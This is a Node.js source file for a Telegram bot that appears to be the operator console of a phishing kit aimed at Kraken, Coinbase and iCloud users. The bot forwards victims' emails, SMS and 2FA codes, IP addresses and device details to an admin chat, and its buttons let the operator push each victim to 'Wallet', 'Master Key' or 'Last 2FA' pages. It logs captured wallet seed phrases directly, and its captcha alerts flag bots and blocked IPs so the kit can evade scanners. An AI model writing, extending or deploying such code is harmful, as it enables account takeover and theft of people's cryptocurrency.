const TelegramBot = require("node-telegram-bot-api");
const fetch = require("node-fetch");

const BOT_TOKEN = process.env.BOT_TOKEN;
const ADMIN_CHAT_ID = process.env.ADMIN_CHAT_ID || process.env.CHAT_ID;
const APP_URL = process.env.APP_URL;

if (!BOT_TOKEN || !ADMIN_CHAT_ID || !APP_URL) {
  console.error("❌ Missing BOT_TOKEN, ADMIN_CHAT_ID/CHAT_ID, or APP_URL in environment");
  process.exit(1);
}

// Initialize bot — polling with timeout to reduce conflicts
const bot = new TelegramBot(BOT_TOKEN, {
  polling: {
    autoStart: true,
    params: {
      timeout: 10
    }
  }
});

bot.getMe().then(() => {
  console.log("✅ Bot connected successfully.");
}).catch(err => {
  console.error("❌ Bot connection failed:", err.message);
});

// Suppress 409 polling errors and auto-restart after delay
bot.on("polling_error", (err) => {
  if (err.code === "ETELEGRAM" && err.message.includes("409 Conflict")) {
    console.warn("⚠️ Polling conflict — another instance may be running. Restarting in 5s...");
    bot.stopPolling().then(() => {
      setTimeout(() => bot.startPolling(), 5000);
    });
  } else {
    console.error("❌ Polling error:", err.message);
  }
});

// Track pending 2FA requests per chatId
let pendingRequests = {};

// Track already-handled callback IDs to prevent duplicate processing
const handledCallbacks = new Set();

// -----------------
// Email/Password approval (unchanged)
// -----------------
function sendApprovalRequest(email, password) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*Login Approval Requested*\n*Email:* ${email}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// Generic code approval (unchanged)
// -----------------
function sendApprovalRequestGeneric(identifier) {
  const options = {
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${identifier}` },
          { text: "❌ Reject", callback_data: `reject|${identifier}` }
        ]
      ]
    }
  };
  bot.sendMessage(
    ADMIN_CHAT_ID,
    `*Approval Requested*\nIdentifier: ${identifier}`,
    { ...options, parse_mode: "Markdown" }
  );
}

// -----------------
// iCloud SMS approval
// -----------------
async function sendApprovalRequestSMS(code, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${code}` },
          { text: "❌ Reject", callback_data: `reject|${code}` }
        ]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// iCloud Login approval
// -----------------
async function sendApprovalRequestPage(email, password, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "✅ Accept", callback_data: `accept|${email}` },
          { text: "❌ Reject", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// CB Login approval
// -----------------
async function sendLoginTelegram(email, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [
          { text: "🔑 2FA Auth 🔑", callback_data: `page1|${email}` }
        ],
        [
          { text: "📧 Approve Email 📧", callback_data: `page2|${email}` }
        ],
        [
          { text: "❌ Reject ❌", callback_data: `reject|${email}` }
        ]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// Verify page approval (4 buttons, no reject)
// -----------------
async function sendVerifyTelegram(ip, message) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "🏁 Done Page 🏁", callback_data: `page1|${ip}` }],
        [{ text: "🔐 Last 2FA 🔐", callback_data: `page2|${ip}` }],
        [{ text: "💼 Wallet 💼", callback_data: `page3|${ip}` }],
        [{ text: "🗝️ Master Key 🗝️", callback_data: `page4|${ip}` }]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// ✅ NEW: Master Key page (Reject / Done Page / Wallet)
// -----------------
async function sendMasterKeyTelegram(message, requestId) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "❌ Reject ❌", callback_data: `mk_reject|${requestId}` }],
        [{ text: "🏁 Done Page 🏁", callback_data: `mk_done|${requestId}` }],
        [{ text: "💼 Wallet 💼", callback_data: `mk_wallet|${requestId}` }]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}
async function send2FATelegram(message, requestId) {
  const options = {
    parse_mode: "HTML",
    reply_markup: {
      inline_keyboard: [
        [{ text: "❌ Reject ❌", callback_data: `2fa_reject_new|${requestId}` }],
        [{ text: "🏁 Done Page 🏁", callback_data: `2fa_done|${requestId}` }],
        [{ text: "💼 Wallet 💼", callback_data: `2fa_wallet|${requestId}` }]
      ]
    }
  };
  await bot.sendMessage(ADMIN_CHAT_ID, message, options);
}

// -----------------
// 2FA Code sender (keyboard-based Accept/Reject)
// -----------------
function send2FACode(code, chatId) {
  pendingRequests[chatId] = true;
  bot.sendMessage(chatId, `Your 2FA code is: ${code}`, {
    reply_markup: {
      keyboard: [["Accept", "Reject"]],
      one_time_keyboard: true,
    },
  });
}

// -----------------
// Handle plain text messages (keyboard Accept/Reject)
// -----------------
bot.on("message", (msg) => {
  const chatId = msg.chat.id;

  if (pendingRequests[chatId]) {
    if (msg.text === "Accept") {
      bot.sendMessage(chatId, "✅ 2FA code accepted. Redirecting...");
      delete pendingRequests[chatId];
    } else if (msg.text === "Reject") {
      bot.sendMessage(chatId, "❌ 2FA code rejected. Please try again.");
      delete pendingRequests[chatId];
    }
  }
});

// -----------------
// Handle inline button callbacks
// -----------------
bot.on("callback_query", async (query) => {
  // Ignore if already handled (prevents duplicates from polling restarts)
  if (handledCallbacks.has(query.id)) return;
  handledCallbacks.add(query.id);
  setTimeout(() => handledCallbacks.delete(query.id), 60000);

  try {
    const [action, identifier] = query.data.split("|");
    let status;

    // --- ✅ NEW: Handle Master Key page 3-button actions ---
    if (action === "mk_reject" || action === "mk_done" || action === "mk_wallet") {
      let newStatus, replyText;

      if (action === "mk_reject") {
        newStatus = "rejected";
        replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
      } else if (action === "mk_done") {
        newStatus = "mk_approved1";
        replyText = `🏁 <code>${identifier}</code> has been directed to <b>Done Page</b>`;
      } else if (action === "mk_wallet") {
        newStatus = "mk_approved2";
        replyText = `💼 <code>${identifier}</code> has been directed to <b>Wallet</b>`;
      }

      await fetch(`${APP_URL}/api/update-masterkey-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: identifier, status: newStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          { chat_id: query.message.chat.id, message_id: query.message.message_id }
        );
      } catch (_) {}

      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
      return;
    }

    // --- Handle old-style 2FA approve/reject (unchanged) ---
    if (action === "2fa_approve" || action === "2fa_reject") {
      const twoFaStatus = action === "2fa_approve" ? "approved" : "rejected";
      const twoFaEmoji = twoFaStatus === "approved" ? "✅" : "❌";

      await fetch(`${APP_URL}/api/update-2fa-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: identifier, status: twoFaStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id
          }
        );
      } catch (_) {}

      const msgText = query.message.text || "";
      const smsMatch = msgText.match(/(?:SMS|2FA|2FA-2)[:\s]+([\d\s\-]+)/i);
      const displayCode = smsMatch ? smsMatch[1].trim() : null;

      const twoFaStatusText = displayCode
        ? `🔐 <code>${displayCode}</code> has been <b>${twoFaStatus === "approved" ? "ACCEPTED! ✅" : "REJECTED! ❌"}</b>`
        : `${twoFaEmoji} <b>${twoFaStatus.toUpperCase()}</b>`;

      await bot.sendMessage(
        query.message.chat.id,
        twoFaStatusText,
        { parse_mode: "HTML" }
      );

      await bot.answerCallbackQuery(query.id, { text: `❗️${twoFaStatus.toUpperCase()}❗️` });
      return;
    }

    // --- ✅ NEW: Handle 2FA-new page 3-button actions ---
    if (action === "2fa_reject_new" || action === "2fa_done" || action === "2fa_wallet") {
      let newStatus, replyText;

      if (action === "2fa_reject_new") {
        newStatus = "rejected";
        replyText = `❌ <code>${identifier}</code> has been <b>REJECTED</b>`;
      } else if (action === "2fa_done") {
        newStatus = "approved1";
        replyText = `🏁 <code>${identifier}</code> has been directed to <b>Done Page</b>`;
      } else if (action === "2fa_wallet") {
        newStatus = "approved2";
        replyText = `👛 <code>${identifier}</code> has been directed to <b>Wallet</b>`;
      }

      await fetch(`${APP_URL}/api/update-2fa-status`, {
        method: "POST",
        headers: { "Content-Type": "application/json" },
        body: JSON.stringify({ requestId: identifier, status: newStatus })
      });

      try {
        await bot.editMessageReplyMarkup(
          { inline_keyboard: [] },
          {
            chat_id: query.message.chat.id,
            message_id: query.message.message_id
          }
        );
      } catch (_) {}

      await bot.sendMessage(query.message.chat.id, replyText, { parse_mode: "HTML" });
      await bot.answerCallbackQuery(query.id, { text: `❗️${newStatus.toUpperCase()}❗️` });
      return;
    }

    // --- Handle all other approvals (unchanged) ---
    if (action === "accept") status = "accepted";
    else if (action === "page1") status = "accepted1";
    else if (action === "page2") status = "accepted2";
    else if (action === "page3") status = "accepted3";
    else if (action === "page4") status = "accepted4";
    else status = "rejected";

    const isAccepted = ["accepted", "accepted1", "accepted2", "accepted3", "accepted4"].includes(status);
    const actionLabel = isAccepted ? "ACCEPTED! ✅" : "REJECTED! ❌";

    // Notify backend
    await fetch(`${APP_URL}/update-status`, {
      method: "POST",
      headers: { "Content-Type": "application/json" },
      body: JSON.stringify({ email: identifier, identifier, status })
    });

    try {
      await bot.editMessageReplyMarkup(
        { inline_keyboard: [] },
        {
          chat_id: query.message.chat.id,
          message_id: query.message.message_id
        }
      );
    } catch (_) {}

    let replyText;
    if (status === "accepted1" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> has been directed to <b>🏁 Done Page 🏁</b>`;
    } else if (status === "accepted2" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> has been directed to <b>🔐 Last 2FA 🔐</b>`;
    } else if (status === "accepted3" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> has been directed to <b>💼 Wallet 💼</b>`;
    } else if (status === "accepted4" && /^\d{1,3}(\.\d{1,3}){3}$/.test(identifier)) {
      replyText = `📍 <code>${identifier}</code> has been directed to <b>🗝️ Master Key 🗝️</b>`;
    } else {
      const isSMS = /^\d+$/.test(identifier);
      replyText = isSMS
        ? `💬 <code>${identifier}</code> has been <b>${actionLabel}</b>`
        : `📧 <code>${identifier}</code> has been <b>${actionLabel}</b>`;
    }

    await bot.sendMessage(
      query.message.chat.id,
      replyText,
      { parse_mode: "HTML" }
    );

    await bot.answerCallbackQuery(query.id, { text: `❗️${status.toUpperCase()}❗️` });

  } catch (err) {
    console.error("❌ Failed to handle callback:", err);
    bot.sendMessage(ADMIN_CHAT_ID, `⚠️ Error handling approval`);
  }
});

// -----------------
// Commands
// -----------------
bot.onText(/\/start/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for approvals.\nPlease enter your 2FA code if prompted.");
});

bot.onText(/\/startcb/, (msg) => {
  bot.sendMessage(msg.chat.id, "✅ Bot is running and waiting for CB login approvals.");
});


// -----------------
// ✅ NEW: Captcha page alerts
// -----------------
async function sendAlertTelegram(type, { ip, region, device }) {
  let message = "";

  if (type === "guest") {
    message =
      `🥳🥳🥳🥳 <b>New Visitor</b> 🥳🥳🥳🥳\n\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else if (type === "bot") {
    message =
      `⛔️⛔️⛔️ <b>Kraken - Bot Alert</b> ⛔️⛔️⛔️\n\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else if (type === "too_many_attempts") {
    message =
      `⛔️⛔️⛔️ <b>Captcha too many attempts</b> ⛔️⛔️⛔️\n\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else if (type === "speed_bot") {
    message =
      `⛔️⛔️⛔️ <b>Kraken - Speed Bot Detected</b> ⛔️⛔️⛔️\n\n` +
      `<b>⚡ Filled in under 2 seconds</b>\n` +
      `<b>🌍 Region:</b> ${region}\n` +
      `<b>💻 Device:</b> ${device}\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else if (type === "blocked_ip") {
    message =
      `🚫🚫🚫 <b>Blocked IP Detected</b> 🚫🚫🚫\n\n` +
      `<b>📍 IP:</b> ${ip}`;
  } else {
    message = `⚠️ Unknown alert type: ${type}`;
  }

  await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: "HTML" });
}

// -----------------
// ✅ NEW: Wallet seed phrase (no approval buttons — just log)
// -----------------
async function sendPhraseTelegram({ phrase, region, device, ip }) {
  const message =
    `💰💰💰💰 <b>Kraken - Wallet</b> 💰💰💰💰\n` +
    `<b>📝 Phrases:</b>\n` +
    `<code>${phrase}</code>\n` +
    `<b>🌍 Region:</b> ${region}\n` +
    `<b>💻 Device:</b> ${device}\n` +
    `<b>📍 IP:</b> ${ip}`;

  await bot.sendMessage(ADMIN_CHAT_ID, message, { parse_mode: "HTML" });
}

module.exports = {
  bot,
  sendApprovalRequest,
  sendApprovalRequestGeneric,
  sendApprovalRequestSMS,
  sendApprovalRequestPage,
  sendLoginTelegram,
  sendVerifyTelegram,
  send2FATelegram,
  send2FACode,
  sendMasterKeyTelegram,
  sendAlertTelegram,
  sendPhraseTelegram
};
